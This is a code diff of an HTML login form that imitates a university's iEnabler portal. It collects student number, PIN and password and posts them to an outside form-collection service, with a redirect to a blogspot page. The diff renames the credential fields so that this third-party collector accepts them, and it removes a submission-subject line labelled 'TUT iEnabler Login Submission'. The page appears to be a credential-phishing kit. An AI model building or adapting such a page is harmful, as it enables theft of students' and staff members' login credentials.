@@ -261,22 +261,17 @@
           action="https://forminit.com/f/prxg0k75gif"
           method="POST">
    
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_subject" value="TUT iEnabler Login Submission">
-      <input type="hidden" name="_next" value="https://student-query.blogspot.com/2026/03/tut-student-query-portal-root-navy.html">
-      <input type="hidden" name="_template" value="table">
-
-      <!-- User type radio -->
+      <!-- User type radio - using fi-select or fi-radio -->
       <div class="radio-row">
-        <label><input type="radio" name="User_Type" value="Student" checked> Student</label>
-        <label><input type="radio" name="User_Type" value="Personnel"> Personnel</label>
-        <label><input type="radio" name="User_Type" value="Other"> Other</label>
-        <label><input type="radio" name="User_Type" value="Alumni"> Alumni</label>
+        <label><input type="radio" name="fi-radio-usertype" value="Student" checked> Student</label>
+        <label><input type="radio" name="fi-radio-usertype" value="Personnel"> Personnel</label>
+        <label><input type="radio" name="fi-radio-usertype" value="Other"> Other</label>
+        <label><input type="radio" name="fi-radio-usertype" value="Alumni"> Alumni</label>
       </div>
 
       <!-- Student Number -->
       <div class="field-label">Student Number:</div>
-      <input class="tut-input" type="text" name="Student_Number"
+      <input class="tut-input" type="text" name="fi-text-studentnumber"
              id="studentNumber"
              placeholder=""
              autocomplete="off"
@@ -284,7 +279,7 @@
 
       <!-- PIN -->
       <div class="field-label">Pin:</div>
-      <input class="tut-input" type="password" name="PIN"
+      <input class="tut-input" type="password" name="fi-password-pin"
              id="pinField"
              placeholder=""
              maxlength="5"
@@ -296,7 +291,7 @@
 
       <!-- Password -->
       <div class="field-label">Password:</div>
-      <input class="tut-input" type="password" name="Password"
+      <input class="tut-input" type="password" name="fi-password-password"
              id="passwordField"
              placeholder=""
              autocomplete="off"
